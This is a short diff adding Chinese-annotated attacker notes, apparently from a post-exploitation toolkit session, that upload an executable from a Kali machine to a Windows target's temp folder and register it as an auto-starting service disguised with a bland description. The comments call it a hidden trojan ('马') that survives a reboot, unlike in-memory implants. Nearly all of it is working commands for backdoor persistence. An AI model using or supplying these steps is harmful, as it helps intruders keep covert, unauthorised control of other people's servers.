@@ -1,0 +1,17 @@
+使用attack
+
+cd c:/windows/temp
+ls
+
+upload /home/kali/b.exe
+
+shell sc create "thisserver" binpath="c:\windows\temp\b.exe"
+
+shell sc description "thisserver" "zhe shi fu wu"
+
+shell sc config "thisserver" start=auto
+
+shell net start "thisserver"
+#如果目标服务器重新启动
+#你会发现你的SC隐藏马可以使用
+#但是运行在内存的马不可以使用了
